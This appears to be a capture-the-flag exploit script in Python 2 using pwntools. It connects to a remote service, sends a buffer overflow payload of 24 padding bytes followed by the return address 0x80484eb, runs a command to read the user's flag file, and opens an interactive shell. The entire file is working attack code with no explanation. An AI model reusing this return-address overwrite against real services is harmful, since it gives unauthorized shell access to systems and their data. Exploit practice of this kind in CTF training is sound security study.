#!/usr/bin/env python2
from pwn import *


#host , port = '172.16.115.109' , 10100
#host , port = '192.168.78.252' , 4000
host , port = 'ctf.yuawn.idv.tw' , 10105
host , port = '172.16.115.109' , 10105
y = remote( host , port )

p = 'a' * 24
p += p32( 0x80484eb )

log.success('Attack payload -> {}'.format(p))

y.send(p)

y.sendline('cat /home/`whoami`/flag')

y.interactive()